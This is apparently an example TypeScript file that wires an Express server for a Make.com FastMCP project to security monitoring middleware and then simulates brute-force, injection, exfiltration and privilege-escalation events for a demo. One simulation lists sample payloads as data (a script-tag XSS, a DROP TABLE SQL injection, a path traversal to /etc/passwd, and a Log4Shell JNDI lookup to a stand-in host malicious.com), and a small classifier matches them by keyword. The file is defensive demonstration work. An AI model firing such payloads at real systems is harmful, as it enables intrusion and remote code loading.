/**
 * Security Monitoring Integration Example
 * Demonstrates how to integrate the advanced security monitoring system
 * with the Make.com FastMCP server
 */

import express from 'express';
import { createAdvancedSecurityMiddleware, advancedSecurityMonitoring } from '../middleware/advanced-security-monitoring.js';
import { concurrentSecurityAgent } from '../utils/concurrent-security-agent.js';
import { SecurityEventType, SecuritySeverity } from '../middleware/security-monitoring.js';
import logger from '../lib/logger.js';

/**
 * Example Express application with integrated security monitoring
 */
export class SecurityMonitoringIntegrationExample {
  private app: express.Application;
  private server?: any;

  constructor() {
    this.app = express();
    this.setupSecurityMiddleware();
    this.setupRoutes();
    this.setupSecurityEventHandlers();
  }

  /**
   * Set up security middleware stack
   */
  private setupSecurityMiddleware(): void {
    // Add the advanced security monitoring middleware
    this.app.use(createAdvancedSecurityMiddleware());

    // Add basic Express middleware
    this.app.use(express.json({ limit: '10mb' }));
    this.app.use(express.urlencoded({ extended: true }));
  }

  /**
   * Set up example routes with different security profiles
   */
  private setupRoutes(): void {
    // Public endpoint - low risk
    this.app.get('/api/health', (req, res) => {
      res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        correlationId: (req as any).securityContext?.correlationId
      });
    });

    // Authentication endpoint - medium risk
    this.app.post('/api/auth/login', async (req, res) => {
      const { username, password } = req.body;

      // Simulate authentication logic
      if (!username || !password) {
        // Record authentication failure
        await concurrentSecurityAgent.processSecurityEvent({
          type: SecurityEventType.AUTHENTICATION_FAILURE,
          severity: SecuritySeverity.MEDIUM,
          source: 'auth_endpoint',
          details: {
            reason: 'missing_credentials',
            username: username || 'unknown',
            endpoint: '/api/auth/login'
          },
          correlationId: (req as any).securityContext?.correlationId,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent']
        });

        return res.status(401).json({ 
          error: 'Authentication failed',
          correlationId: (req as any).securityContext?.correlationId
        });
      }

      // Simulate successful authentication
      res.json({
        success: true,
        token: 'demo-jwt-token',
        correlationId: (req as any).securityContext?.correlationId
      });
    });

    // Sensitive data endpoint - high risk
    this.app.get('/api/sensitive/credentials', (req, res) => {
      // Check authorization
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ 
          error: 'Unauthorized access to sensitive endpoint',
          correlationId: (req as any).securityContext?.correlationId
        });
      }

      res.json({
        credentials: [
          { id: '1', name: 'demo-cred-1', type: 'api_key' },
          { id: '2', name: 'demo-cred-2', type: 'oauth_token' }
        ],
        correlationId: (req as any).securityContext?.correlationId
      });
    });

    // Admin endpoint - critical risk
    this.app.post('/api/admin/system', async (req, res) => {
      const { action } = req.body;

      // Record administrative action
      await concurrentSecurityAgent.processSecurityEvent({
        type: SecurityEventType.SUSPICIOUS_BEHAVIOR,
        severity: SecuritySeverity.HIGH,
        source: 'admin_endpoint',
        details: {
          action: action || 'unknown',
          endpoint: '/api/admin/system',
          timestamp: new Date().toISOString()
        },
        correlationId: (req as any).securityContext?.correlationId,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent']
      });

      res.json({
        message: 'Administrative action logged',
        action: action,
        correlationId: (req as any).securityContext?.correlationId
      });
    });

    // Webhook endpoint - external integration risk
    this.app.post('/api/webhooks/make', async (req, res) => {
      const signature = req.headers['x-make-signature'];
      
      if (!signature) {
        // Record suspicious webhook activity
        await concurrentSecurityAgent.processSecurityEvent({
          type: SecurityEventType.MALICIOUS_INPUT_DETECTED,
          severity: SecuritySeverity.HIGH,
          source: 'webhook_endpoint',
          details: {
            reason: 'missing_signature',
            headers: Object.keys(req.headers),
            contentType: req.headers['content-type']
          },
          correlationId: (req as any).securityContext?.correlationId,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent']
        });

        return res.status(400).json({ 
          error: 'Invalid webhook signature',
          correlationId: (req as any).securityContext?.correlationId
        });
      }

      res.json({
        received: true,
        timestamp: new Date().toISOString(),
        correlationId: (req as any).securityContext?.correlationId
      });
    });

    // Security dashboard endpoint
    this.app.get('/api/security/dashboard', (req, res) => {
      const securityStatus = advancedSecurityMonitoring.getStatus();
      const agentStatus = concurrentSecurityAgent.getStatus();

      res.json({
        securityMonitoring: securityStatus,
        securityAgent: agentStatus,
        timestamp: new Date().toISOString(),
        correlationId: (req as any).securityContext?.correlationId
      });
    });
  }

  /**
   * Set up security event handlers
   */
  private setupSecurityEventHandlers(): void {
    // Listen for high-severity security events
    concurrentSecurityAgent.on('threat', (threat) => {
      logger.warn('High-severity threat detected', {
        threatId: threat.id,
        severity: threat.severity,
        threatScore: threat.threatScore,
        source: threat.source
      });

      // In production, this could trigger:
      // - Email alerts
      // - Slack notifications
      // - SIEM integration
      // - Automated response actions
    });

    // Listen for security incidents
    concurrentSecurityAgent.on('incident', (incident) => {
      logger.error('Security incident created', {
        incidentId: incident.id,
        severity: incident.severity,
        status: incident.status,
        events: incident.events
      });

      // In production, this could:
      // - Create tickets in ITSM systems
      // - Trigger incident response workflows
      // - Notify security team
      // - Activate emergency procedures
    });

    // Listen for metrics updates
    concurrentSecurityAgent.on('metrics', (metrics) => {
      logger.info('Security metrics update', {
        timestamp: metrics.timestamp,
        eventsProcessed: metrics.eventsProcessed,
        threatsDetected: metrics.threatsDetected,
        riskScore: metrics.riskScore,
        systemHealth: metrics.systemHealth
      });

      // In production, this could:
      // - Send metrics to monitoring systems
      // - Update dashboards
      // - Trigger alerts on thresholds
      // - Generate reports
    });
  }

  /**
   * Start the example server
   */
  public async start(port: number = 3000): Promise<void> {
    return new Promise((resolve) => {
      this.server = this.app.listen(port, () => {
        logger.info('Security monitoring integration example started', {
          port,
          endpoints: [
            'GET /api/health',
            'POST /api/auth/login',
            'GET /api/sensitive/credentials',
            'POST /api/admin/system',
            'POST /api/webhooks/make',
            'GET /api/security/dashboard'
          ]
        });
        resolve();
      });
    });
  }

  /**
   * Stop the example server
   */
  public async stop(): Promise<void> {
    return new Promise((resolve) => {
      if (this.server) {
        this.server.close(() => {
          logger.info('Security monitoring integration example stopped');
          resolve();
        });
      } else {
        resolve();
      }
    });
  }

  /**
   * Demonstrate security monitoring capabilities
   */
  public async demonstrateSecurityCapabilities(): Promise<void> {
    logger.info('Demonstrating security monitoring capabilities...');

    // Simulate various security events
    await this.simulateBruteForceAttack();
    await this.simulateMaliciousInputs();
    await this.simulateDataExfiltration();
    await this.simulatePrivilegeEscalation();

    // Check compliance status
    await this.checkComplianceStatus();

    // Export security data
    await this.exportSecurityReports();
  }

  private async simulateBruteForceAttack(): Promise<void> {
    logger.info('Simulating brute force attack...');

    for (let i = 0; i < 10; i++) {
      await concurrentSecurityAgent.processSecurityEvent({
        type: SecurityEventType.AUTHENTICATION_FAILURE,
        severity: SecuritySeverity.MEDIUM,
        source: 'demo_brute_force',
        details: {
          username: 'admin',
          attempt: i + 1,
          password_length: 8
        },
        ipAddress: '203.0.113.100',
        userAgent: 'curl/7.68.0'
      });

      // Small delay to simulate real attack timing
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    logger.info('Brute force attack simulation completed');
  }

  private async simulateMaliciousInputs(): Promise<void> {
    logger.info('Simulating malicious input attempts...');

    const maliciousInputs = [
      '<script>alert("xss")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '${jndi:ldap://malicious.com/exp}'
    ];

    for (const input of maliciousInputs) {
      await concurrentSecurityAgent.processSecurityEvent({
        type: SecurityEventType.MALICIOUS_INPUT_DETECTED,
        severity: SecuritySeverity.HIGH,
        source: 'demo_malicious_input',
        details: {
          input: input,
          attack_type: this.identifyAttackType(input),
          blocked: true
        },
        ipAddress: '198.51.100.50',
        userAgent: 'Mozilla/5.0 (compatible; AttackBot/1.0)'
      });
    }

    logger.info('Malicious input simulation completed');
  }

  private async simulateDataExfiltration(): Promise<void> {
    logger.info('Simulating data exfiltration attempt...');

    await concurrentSecurityAgent.processSecurityEvent({
      type: SecurityEventType.SUSPICIOUS_BEHAVIOR,
      severity: SecuritySeverity.CRITICAL,
      source: 'demo_data_exfiltration',
      details: {
        action: 'bulk_data_access',
        records_accessed: 10000,
        data_size_mb: 500,
        unusual_time: true,
        external_ip: true
      },
      ipAddress: '192.0.2.200',
      userAgent: 'python-requests/2.25.1'
    });

    logger.info('Data exfiltration simulation completed');
  }

  private async simulatePrivilegeEscalation(): Promise<void> {
    logger.info('Simulating privilege escalation attempt...');

    await concurrentSecurityAgent.processSecurityEvent({
      type: SecurityEventType.AUTHORIZATION_FAILURE,
      severity: SecuritySeverity.CRITICAL,
      source: 'demo_privilege_escalation',
      details: {
        action: 'admin_access_attempt',
        current_role: 'user',
        requested_role: 'admin',
        escalation_method: 'parameter_tampering'
      },
      ipAddress: '203.0.113.150',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    });

    logger.info('Privilege escalation simulation completed');
  }

  private async checkComplianceStatus(): Promise<void> {
    logger.info('Checking compliance status...');

    const frameworks = ['SOC2', 'PCI_DSS', 'GDPR'];
    
    for (const framework of frameworks) {
      try {
        const compliance = await concurrentSecurityAgent.validateCompliance(framework);
        logger.info(`Compliance check for ${framework}`, {
          framework,
          compliant: compliance.compliant,
          violations: compliance.violations.length,
          recommendations: compliance.recommendations.length
        });
      } catch (error) {
        logger.error(`Failed to check ${framework} compliance`, {
          framework,
          error: error instanceof Error ? error.message : String(error)
        });
      }
    }
  }

  private async exportSecurityReports(): Promise<void> {
    logger.info('Generating security reports...');

    try {
      const securityData = await concurrentSecurityAgent.exportSecurityData({
        includeEvents: true,
        includeIncidents: true,
        includeMetrics: true,
        timeRange: {
          start: new Date(Date.now() - 24 * 60 * 60 * 1000), // Last 24 hours
          end: new Date()
        }
      });

      logger.info('Security report generated', {
        events: securityData.events?.length || 0,
        incidents: securityData.incidents?.length || 0,
        metricsPoints: securityData.metrics?.length || 0
      });
    } catch (error) {
      logger.error('Failed to generate security report', {
        error: error instanceof Error ? error.message : String(error)
      });
    }
  }

  private identifyAttackType(input: string): string {
    if (input.includes('<script>') || input.includes('javascript:')) {
      return 'XSS';
    } else if (input.includes('DROP TABLE') || input.includes('UNION SELECT')) {
      return 'SQL_INJECTION';
    } else if (input.includes('../') || input.includes('..\\')) {
      return 'PATH_TRAVERSAL';
    } else if (input.includes('${jndi:') || input.includes('${java:')) {
      return 'LOG4J_INJECTION';
    }
    return 'UNKNOWN';
  }
}

/**
 * Example usage
 */
export async function runSecurityMonitoringExample(): Promise<void> {
  const example = new SecurityMonitoringIntegrationExample();
  
  try {
    // Start the server
    await example.start(3001);
    
    // Demonstrate security capabilities
    await example.demonstrateSecurityCapabilities();
    
    // Keep running for a bit to show real-time monitoring
    logger.info('Security monitoring example running... (will stop in 30 seconds)');
    await new Promise(resolve => setTimeout(resolve, 30000));
    
  } catch (error) {
    logger.error('Security monitoring example failed', {
      error: error instanceof Error ? error.message : String(error)
    });
  } finally {
    // Clean shutdown
    await example.stop();
    await advancedSecurityMonitoring.shutdown();
    await concurrentSecurityAgent.shutdown();
  }
}

// Run the example if this file is executed directly
if (require.main === module) {
  runSecurityMonitoringExample().catch(console.error);
}